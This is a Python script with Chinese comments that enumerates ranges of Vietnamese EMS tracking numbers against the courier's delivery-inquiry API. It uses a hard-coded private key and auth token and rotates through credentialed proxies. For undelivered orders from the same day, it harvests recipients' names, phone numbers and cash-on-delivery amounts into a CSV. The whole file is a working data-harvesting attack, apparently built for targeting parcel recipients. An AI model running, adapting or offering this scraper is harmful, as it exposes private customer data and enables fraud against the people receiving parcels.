#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
直接跳转到密集区域扫描 - 快速找到订单
"""
import hashlib, requests, time, random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

API_URL = "https://api-dingdong.ems.com.vn/"
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
BASIC_AUTH = "bG90dG5ldDpkbXM="

TODAY = datetime.now().strftime("%d/%m/%Y")
state = {'found': 0, 'tested': 0, 'orders': [], 'lock': threading.Lock(), 'start_time': time.time()}
print_lock = threading.Lock()

# 实时CSV文件
realtime_csv_file = f"quick_orders_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
csv_lock = threading.Lock()

# 少量优质代理
PROXIES = [
    "23.27.184.245:5846:uadkcvtn:uo2rzar814ph",
    "45.43.70.140:6427:uadkcvtn:uo2rzar814ph",
    "82.24.233.117:5439:uadkcvtn:uo2rzar814ph",
]

proxies = []

def load_proxies():
    global proxies
    for p in PROXIES:
        parts = p.split(':')
        if len(parts) == 4:
            ip, port, user, pwd = parts
            proxies.append({'http': f'http://{user}:{pwd}@{ip}:{port}', 'https': f'http://{user}:{pwd}@{ip}:{port}'})
    print(f"✅ 加载 {len(proxies)} 个优质代理\n")

def init_csv():
    headers = ['运单号', '收件人', '电话', 'COD金额', '运费', '发件日期', '装载日期', '发现时间']
    with open(realtime_csv_file, 'w', encoding='utf-8-sig') as f:
        f.write(','.join(headers) + '\n')
    print(f"📄 CSV文件: {realtime_csv_file}")

def save_to_csv(order):
    with csv_lock:
        try:
            row = [
                order['tracking'], order.get('ReceiverName', ''), order.get('ReceiverPhone', ''),
                str(order.get('CollectAmount', 0)), str(order.get('FeeShip', 0)),
                order.get('IssueDate', ''), order.get('LoadDate', ''),
                datetime.now().strftime('%H:%M:%S')
            ]
            formatted_row = [f'"{str(item)}"' for item in row]
            with open(realtime_csv_file, 'a', encoding='utf-8-sig') as f:
                f.write(','.join(formatted_row) + '\n')
                f.flush()
        except Exception as e:
            safe_print(f"❌ CSV保存错误: {e}")

def sign(text):
    return hashlib.sha256((text + PRIVATE_KEY).encode()).hexdigest().upper()

def safe_print(msg):
    with print_lock:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

def is_today(date_str):
    if not date_str:
        return False
    date_str = str(date_str)
    today_dd_mm_yyyy = datetime.now().strftime("%d/%m/%Y")
    today_mm_dd_yyyy = datetime.now().strftime("%m/%d/%Y")
    return (today_dd_mm_yyyy in date_str or today_mm_dd_yyyy in date_str)

def check_order(tracking):
    try:
        with state['lock']:
            state['tested'] += 1
        
        sig = sign(tracking)
        headers = {
            "Authorization": f"Basic {BASIC_AUTH}",
            "APIKey": PRIVATE_KEY,
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        proxy = random.choice(proxies) if proxies else None
        
        response = requests.post(
            f"{API_URL}api/Delivery/Inquiry",
            headers=headers,
            data={"ParcelCode": tracking, "Signature": sig},
            proxies=proxy,
            timeout=12
        )
        
        if response.status_code == 200:
            data = response.json()
            if data.get('Code') == '00' and data.get('Value'):
                v = data['Value']
                
                delivery_date = v.get('DeliveryDate', '')
                issue_date = v.get('IssueDate', '')
                load_date = v.get('LoadDate', '')
                
                is_delivered = bool(delivery_date)
                is_today_order = is_today(issue_date) or is_today(load_date)
                
                if not is_delivered and is_today_order:
                    order = {
                        'tracking': tracking,
                        'ReceiverName': v.get('ReceiverName', ''),
                        'ReceiverPhone': v.get('ReceiverPhone', ''),
                        'CollectAmount': v.get('CollectAmount', 0),
                        'FeeShip': v.get('FeeShip', 0),
                        'IssueDate': issue_date,
                        'LoadDate': load_date,
                    }
                    
                    with state['lock']:
                        state['found'] += 1
                        state['orders'].append(order)
                    
                    save_to_csv(order)
                    
                    elapsed = time.time() - state['start_time']
                    speed = state['tested'] / elapsed if elapsed > 0 else 0
                    
                    safe_print(f"✅ [{state['found']}] {tracking} | "
                              f"{order['ReceiverName'][:15]} | "
                              f"{order['CollectAmount']:,}₫ | "
                              f"⚡{speed:.0f}/s")
                    
                    return True
        
        return False
        
    except Exception as e:
        return False

def main():
    print(f"""
╔════════════════════════════════════════════════════════════════════════════╗
║                    🚀 快速密集区扫描器                                     ║
╚════════════════════════════════════════════════════════════════════════════╝

⚡ 优化策略:
  • 直接跳转到已知有订单的密集区域
  • 减少线程数 (适应你的网络环境)
  • 优质代理池 (只用最好的3个代理)
  • 增加超时时间 (适应慢网络)

🎯 密集区域 (直接扫描有订单的区域):
  • EF047530000-047540000 (已知密集区)
  • EP492999000-493020000 (已知密集区)
  • EP493005000-493015000 (已知密集区)

📄 保存文件: {realtime_csv_file}
""")
    
    load_proxies()
    init_csv()
    
    # 直接扫描密集区域
    dense_ranges = [
        ('EF', 47530000, 47540000, 1),     # EF密集区 - 10000个号段
        ('EP', 492999000, 493020000, 1),   # EP密集区 - 21000个号段  
        ('EP', 493005000, 493015000, 1),   # EP另一密集区 - 10000个号段
    ]
    
    safe_print("🚀 开始扫描密集区域...")
    start_time = time.time()
    
    # 减少线程数，适应慢网络
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        
        for prefix, start, end, step in dense_ranges:
            for num in range(start, end, step):
                if state['found'] >= 1000:  # 先找1000个测试
                    break
                tracking = f"{prefix}{num:09d}VN"
                futures.append(executor.submit(check_order, tracking))
        
        safe_print(f"📋 提交了 {len(futures)} 个密集区任务")
        
        for future in as_completed(futures):
            try:
                future.result()
                
                if state['tested'] % 1000 == 0:
                    elapsed = time.time() - start_time
                    speed = state['tested'] / elapsed if elapsed > 0 else 0
                    safe_print(f"📊 已扫{state['tested']} | 找到{state['found']} | {speed:.0f}/s | 成功率{state['found']/state['tested']*100:.2f}%")
            except:
                pass
    
    elapsed = time.time() - start_time
    safe_print(f"""
\n{'='*60}
🎉 密集区扫描完成！
{'='*60}
找到订单: {state['found']} 个
已测试: {state['tested']} 个
成功率: {state['found']/state['tested']*100:.2f}%
耗时: {elapsed:.1f} 秒
速度: {state['tested']/elapsed:.0f} 次/秒

📄 结果文件: {realtime_csv_file}

💡 如果这个版本能快速找到订单，说明原脚本只是扫描顺序问题
{'='*60}
""")

if __name__ == "__main__":
    main()